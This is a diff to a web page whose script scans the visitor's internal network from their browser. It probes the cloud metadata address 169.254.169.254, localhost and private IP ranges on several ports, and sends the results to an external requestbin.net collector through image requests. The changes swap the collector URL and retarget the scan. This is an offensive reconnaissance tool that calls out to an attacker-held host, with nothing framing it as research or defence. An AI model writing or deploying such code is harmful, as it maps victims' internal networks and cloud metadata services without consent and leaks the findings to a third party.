@@ -10,7 +10,7 @@
     <div id="custom_button"></div>
     
     <script>
-    let LOG_URL = "http://requestbin.net/r/c0snvuqf";
+    let LOG_URL = "http://requestbin.net/r/9oesgaz0";
     let LOCAL_HOST = "169.254.169.254";
     let ipIterator="";
     let local_ip_ranges = ["10.", "192.168.", "172.16."];
@@ -125,7 +125,7 @@
               if (scanner.timed_out) 
               {
                   let im = new Image();
-                  im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC&IP="+ip+"&PORT=" + port;
+                  //im.src=LOG_URL+"?TIME=NO RESPONSE AFTER 10SEC&IP="+ip+"&PORT=" + port;
                   //document.getElementById("custom_result").innerHTML = "Case 2 (no response after 10s).";
               } 
               else 
@@ -302,8 +302,8 @@
           bit2 = 0;
       }
   }
-      custom_scan("169.254.169.254", "80");
-      custom_scan("169.254.169.254", "443");
+      custom_scan("127.0.0.1", "80");
+      //custom_scan("169.254.169.254", "443");
       //custom_scan("15.207.101.96", "443");
       //custom_scan("15.207.101.96", "21");
       //custom_scan("15.207.101.96", "6666");
